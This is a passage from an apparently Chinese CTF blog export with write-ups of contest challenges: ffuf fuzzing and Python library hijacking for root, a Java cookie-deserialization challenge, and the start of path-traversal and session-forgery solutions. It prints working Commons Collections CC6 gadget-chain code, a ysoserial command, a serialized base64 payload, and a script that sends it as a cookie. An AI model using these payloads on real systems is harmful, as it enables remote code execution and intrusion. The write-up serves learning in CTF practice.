      <tags>
        <tag>web</tag>
        <tag>红明谷</tag>
      </tags>
  </entry>
  <entry>
    <title>记从校赛学到的新知识</title>
    <url>/2022/04/12/%E8%AE%B0%E4%BB%8E%E6%A0%A1%E8%B5%9B%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<blockquote>
<p>渗透、CC6实际场景利用初体验</p>
</blockquote>
<span id="more"></span>

<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p><a href="https://jasonttu.github.io/2022/01/17/VulnHub-Empire-LupinOne/?highlight=fuf#VulnHub-Empire-LupinOne">wp</a></p>
<p><a href="https://blog.csdn.net/weixin_43220532/article/details/116023233">linux下ssh使用除了22的其它端口来连接远程服务器_CrystalheartLi的博客-CSDN博客_linux除了ssh还有什么能链接服务器</a></p>
<p>问题：</p>
<ul>
<li>kali默认连接端口要增加10022</li>
<li>sshkey文件要增加权限</li>
</ul>
<p>简单记录一下：</p>
<blockquote>
<p>hint:</p>
<p>1.ssh连接10022</p>
<p>2.ffuf  /~hint</p>
</blockquote>
<p>题目有<code>robots.txt</code></p>
<p>进入<code>/~hint/</code>，是假的Error界面</p>
<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://172.22.236.111:8080/~FUZZ -w /usr/share/wfuzz/wordlist/general/common.txt </span><br></pre></td></tr></table></figure>

<p>有<code>~secret</code>，用户为<code>jasontt</code>，密码为<code>1234</code></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220409193703147.png" alt="image-20220409193703147"></p>
<p>要找<code>ssh private key</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://172.22.236.111:8080/~secret/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html,.php</span><br></pre></td></tr></table></figure>

<p>有<code>secret.txt</code>，私钥在这里</p>
<p>base85解密，复制黏贴到kali，新建文件<code>sshkey</code></p>
<blockquote>
<p>注意ssh私钥的格式 在末尾会有一个换行符</p>
</blockquote>
<p>ssh连接</p>
<blockquote>
<p>注意本地的 sshd_config 里面要加上10022端口</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i sshkey jasontt@172.22.36.111 -p 10022</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><a href="https://jasonttu.github.io/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/#more">Python库劫持</a></p>
<p><code>sudo -l</code>  // 显示出自己（执行 sudo 的使用者）的权限</p>
<p>可以发现我们有无密（root）权限执行</p>
<p>本地有<code>Tiquan.py</code>，调用了<code>webbrowser.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate webbrowser.py</span><br><span class="line"># /usr/lib/python3.8/webbrowser.py</span><br></pre></td></tr></table></figure>

<p>而<code>webbrowser.py</code>里面执行了<code>os.system(&quot;/bin/bash&quot;)</code></p>
<blockquote>
<p>赛时做的时候不知道为什么 执行这条命令的时候没有成功进入root </p>
<p>赛后，后来发现os.system没有 用nano加了一下才进去</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root /usr/bin/python3.8 /home/jasontt/Tiquan.py</span><br><span class="line"># 进入root</span><br></pre></td></tr></table></figure>

<p>flag在根目录</p>
<h3 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h3><ul>
<li>java 反序列化</li>
</ul>
<h4 id="赛前"><a href="#赛前" class="headerlink" title="赛前:"></a>赛前:</h4><blockquote>
<p>因为某些原因 一直以为是tomcat内存马 fastjson去了</p>
</blockquote>
<blockquote>
<p>看了wp发现原来没有想象中那么难</p>
</blockquote>
<blockquote>
<p>hint打不开(!!!!!!!!!! 也完全找不到</p>
</blockquote>
<p>又是熟悉的登录界面,尝试之后发现不管登录什么都会登陆成功,所以应该和这个没什么关系</p>
<p>然后扫了一下发现有<code>/admin/html</code>,又是登录,但是又是登录不成功</p>
<p>然后发现cookie里面有一个user,base解密之后可以发现是java序列化之后的byte,也可以看出来是User类又username和password,然后就开始致力于修改cookie实现admin登陆</p>
<p>太菜了,应该能想到cookie是入口的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import java.io.*;</span></span><br><span class="line"><span class="keyword">import</span> Utity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(User std)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        obj.writeObject(std);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">        obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// �� sr demo.Student��e�(�� I idC sexL namet Ljava/lang/String;xp   Yst Ameuu</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;output.txt&quot;</span>)));</span><br><span class="line">        User o =  (User) objectInputStream.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        System.out.println(o.getUsername());</span><br><span class="line">        System.out.println(o.getPassword());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyAApVdGl0eS5Vc2VyaBsf8IrggOECAAJMAAhwYXNzd29yZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHB0AAVhZG1pbg==&quot;</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        OutputStream out = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((len=is.read(buff))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.write(buff, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        is.close();</span><br><span class="line"><span class="comment">//        File file = new File(&quot;output.txt&quot;);</span></span><br><span class="line"><span class="comment">//        FileWriter fileWriter = new FileWriter(file.getAbsoluteFile());</span></span><br><span class="line"><span class="comment">//        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);</span></span><br><span class="line"><span class="comment">//        bufferedWriter.write(String.valueOf(code));</span></span><br><span class="line"><span class="comment">//        bufferedWriter.close();</span></span><br><span class="line"><span class="comment">//        User user = new User();</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        unSerialize();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        File file = new File(&quot;output.txt&quot;);</span></span><br><span class="line"><span class="comment">//        int size = (int) file.length();</span></span><br><span class="line"><span class="comment">//        byte[] buffer = new byte[size];</span></span><br><span class="line"><span class="comment">//        FileInputStream in = null;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            in = new FileInputStream(file);</span></span><br><span class="line"><span class="comment">//            int len = 0;</span></span><br><span class="line"><span class="comment">//            if ((len = in.available()) &lt;= buffer.length) &#123;</span></span><br><span class="line"><span class="comment">//                in.read(buffer, 0, len);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        String base64 = Base64.getEncoder().encodeToString(buffer);</span></span><br><span class="line"><span class="comment">//        System.out.println(base64);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h4><p>（从运维那里拿了docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/97a54f5cd3fb43f3bf7f6825dceed1c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>开始！</p>
<p>因为jdk版本未知，所以用CC6的poc比较保险，可惜一开始不知道为什么执迷于CC1了 思维不行（菜</p>
<p>这里用的是P神的CC6，命令来自wp，比赛的时候hint没打开</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6ForP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,Object[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,Y2F0IC9mbGFnID4uL3dlYmFwcHMvUk9PVC9mbGFnLnBocA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = barr.toByteArray();</span><br><span class="line">        String s = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">            ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者用ysoserial：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4uL3dlYmFwcHMvUk9PVC9mbGFnLnBocA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; | base64</span><br></pre></td></tr></table></figure>

<ol>
<li>可以直接在网页修改cookie，然后访问admin保持登录状态，实现cookie反序列化命令执行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAACYWFzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdABVYmFzaCAtYyB7ZWNobyxZMkYwSUM5bWJHRm5JRDR1TDNkbFltRndjSE12VWs5UFZDOW1iR0ZuTG5Cb2NBPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACYmJ4</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>python</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://82.156.2.166:9999/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;user=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAACYWFzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdABVYmFzaCAtYyB7ZWNobyxZMkYwSUM5bWJHRm5JRDR1TDNkbFltRndjSE12VWs5UFZDOW1iR0ZuTG5Cb2NBPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACYmJ4&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">res = requests.get(url+<span class="string">&quot;admin/&quot;</span>, headers)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">res = requests.get(url=url+<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h4 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h4><p>一共只有四个类<code>Serialize</code>、<code>AuthFilter</code>、<code>doLogin</code>、<code>User</code></p>
<p><code>Serialize</code>就是实现序列化和反序列化，<code>User</code>类也没多少内容，而<code>doLogin</code>就是简单的登录判断，重定向到<code>admin/index.jsp</code>或者<code>/index.jsp</code></p>
<p>实现反序列化主要是在<code>AuthFilter</code>，在<code>/admin/</code>下对cookie进行反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /admin/*</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    HttpServletRequest request = (HttpServletRequest)req;</span><br><span class="line">    HttpServletResponse response = (HttpServletResponse)resp;</span><br><span class="line">    Cookie[] cookies = request.getCookies();</span><br><span class="line">    String cookie = <span class="keyword">null</span>;</span><br><span class="line">    User user = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cookies == <span class="keyword">null</span>) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;请登陆&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= cookies.length) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    user = (User)Serialize.deserialize(cookie); <span class="comment">// 反序列触发链子</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                    var11.printStackTrace();</span><br><span class="line">                    response.sendRedirect(request.getContextPath() + <span class="string">&quot;/index.jsp&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                 ……</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">               </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
<p>还是太菜啦~</p>
</blockquote>
<p>1.ffuf的使用、python劫持库提权、CC6的简单运用</p>
<p>2.渗透真的是直接跟着hhg的博客就可以直接得到flag了，但是一开始在连接ssh上面因为sshkey文档没有换行符卡了半天，然后执行<code>        Tiquan.py</code>的时候一开始有<code>os.system(&quot;/bin/bahs&quot;)</code>，但是弄着弄着这个语句就没了，因为一开始看原来的博客有点不理解，所以也卡了半天，最后看了另一篇博客才得到flag，然后赛后换号复现的时候发现，如果中间没出现问题的的话，直接执行<code>Tiquan.py</code>就可以了，很难过</p>
<p>1.java反序列化，感觉还是太菜了，因为没有做过多少题，所以对cookie上面的反序列化不敏感，反而一直在想构造payload伪造admin登录。一开始跟着payload复现的时候一直在用ysoserial的CC1来构造，总是过不去，后来突然才想到会不会是jdk版本的原因，应该要想到的，得多做点题（（（（</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hznuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第二周学习</title>
    <url>/2022/01/22/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h4><p>打开靶机，是一个魔方游戏，看源码有hint说flag在<code> f1ag_Is_h3re</code>，一开始去js文件里面看了一下，没有发现平时游戏题目中可以利用的点</p>
<p><img src="https://img-blog.csdnimg.cn/0aa9f312cdf643f58d774a23c746b609.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>发现有一个<code>uploads/favicon.ico </code>，直接访问<code>./uploads/</code>，存在两个文件都分别抓一下包，在preview里面发现get传的参，猜测会不会存在文件包含</p>
<p>这里Server是<code>openresty</code>，百度之后发现是基于nginx，那么直接试着看nginx的配置文件啥的</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/de73e1269d4744359168e12261db4aa8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>尝试之后发现有些字符被ban掉了，可以自己试着能不能通过重复等绕过，绕过过滤之后还要进行目录穿越</p>
<p><img src="https://img-blog.csdnimg.cn/c9a2378f738b4ff8991084c09967d7fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那么，想要其他文件就直接在后面改吧，根据提示直接去<code>f1ag_Is_h3re</code>找flag</p>
<p>payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=....//....//....//....//....//....//f1ag_Is_h3rere</span><br></pre></td></tr></table></figure>

<p>但是显示该文件不存在，看了别的师傅的wp</p>
<p>在后面还要加上flag（为什么呢，虽然能理解f1ag_Is_h3re可能是个目录名，但是为什么能想到呢，可能还是一种思维吧</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....//....//....//....//....//....//f1ag_Is_h3rere//flag</span><br></pre></td></tr></table></figure>

<h4 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h4><ul>
<li>经典买东西</li>
<li>session伪造</li>
<li>/proc/self</li>
<li>/environ</li>
</ul>
<p>靶机主页面，经典要用钱买flag，刚好差一块钱，先都看看吧：</p>
<p><img src="https://img-blog.csdnimg.cn/00bc169409ea4ac0a56d906a37dbd376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>抓包，发现又是session伪造，所以我们可以修改balance为1337，这样就可以购买flag了，但是我们不知道密钥呀！！</p>
<p>再次回到首页，康康源码，抓抓包</p>
